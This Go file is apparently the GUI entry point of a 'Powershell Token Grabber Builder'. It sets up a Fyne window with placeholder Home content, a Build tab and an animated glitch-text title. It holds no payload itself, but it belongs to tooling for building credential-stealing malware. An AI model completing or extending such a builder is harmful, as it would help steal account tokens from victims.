package main

import (
	"time"

	"builder/modules/cursed"

	"builder/ui-tabs/builder"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

func main() {
	a := app.New()
	win := a.NewWindow(cursed.Generate("Powershell Token Grabber Builder", "normal", true, true, true))
	win.Resize(fyne.NewSize(500, 400))
	win.CenterOnScreen()

	tabs := container.NewAppTabs(
		container.NewTabItem("Home", widget.NewCard("test", "test", widget.NewLabel("test"))),
		container.NewTabItem("Build", builder.GetBuilder(a)),
	)

	win.SetContent(tabs)

	tabs.SetTabLocation(container.TabLocationLeading)

	win.SetContent(tabs)

	outputChannel := make(chan string)

	go func() {
		ticker := time.NewTicker(25 * time.Millisecond)
		defer ticker.Stop()

		for range ticker.C {
			output := cursed.Generate("Powershell Token Grabber Builder", "normal", true, true, true)
			outputChannel <- output
		}
	}()

	go func() {
		for output := range outputChannel {
			win.SetTitle(output)
		}
	}()

	win.ShowAndRun()
}
